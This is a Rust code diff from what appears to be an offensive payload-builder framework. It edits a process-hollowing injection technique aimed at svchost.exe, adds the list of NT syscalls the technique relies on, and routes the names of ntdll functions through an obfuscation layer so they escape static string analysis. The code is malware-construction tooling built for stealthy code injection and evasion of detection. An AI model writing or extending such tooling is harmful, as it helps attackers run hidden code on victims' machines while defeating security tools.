@@ -27,7 +27,7 @@ pub fn default_target() -> String {
 pub const DEF: TechniqueDef = TechniqueDef {
     name: "process_hollowing",
     attck: &["T1055.012"],
-    stability: Stability::Stable,
+    stability: Stability::Experimental,
     requires: &[Capability::WindowsX64],
     conflicts: &[],
     category: Category::Execution,
@@ -36,29 +36,30 @@ pub const DEF: TechniqueDef = TechniqueDef {
     params_example: r#"technique: process_hollowing
 target: "C:\\Windows\\System32\\svchost.exe""#,
     readme: include_str!("README.md"),
+    syscalls: &[
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory",
+        "NtReadVirtualMemory",
+        "NtResumeThread",
+        "NtUnmapViewOfSection",
+    ],
+    resolves_imports: true,
 };
 
 impl Params {
     /// Renders the process-hollowing stub fragment for these parameters.
     ///
-    /// The per-build values — the target path and the dynamically-resolved
-    /// `ntdll.dll` / `NtUnmapViewOfSection` names — are substituted into the
-    /// fragment's placeholders as code that rebuilds each string at runtime
-    /// (using `strings`'s active strategy), so they do not appear in `strings`.
+    /// The per-build target path is substituted into the fragment's
+    /// placeholder as code that rebuilds the string at runtime (using
+    /// `strings`'s active strategy), so it does not appear in `strings`. The
+    /// `ntdll.dll` / `NtUnmapViewOfSection` names moved to the syscall layer
+    /// (`engine::syscalls`), which obfuscates them the same way.
     pub fn render_fragment(&self, strings: &StringsConfig) -> String {
         let target_def = strings
             .obfuscate(&self.target)
             .render_stub_expr("hollow_target");
-        let ntdll_def = strings
-            .obfuscate("ntdll.dll")
-            .render_stub_expr("ntdll_name");
-        let unmap_def = strings
-            .obfuscate("NtUnmapViewOfSection")
-            .render_stub_expr("unmap_func");
         DEF.stub_fragment
             .replace("$HOLLOW_TARGET_DEF$", &target_def)
-            .replace("$NTDLL_DEF$", &ntdll_def)
-            .replace("$UNMAP_FUNC_DEF$", &unmap_def)
     }
 }
 
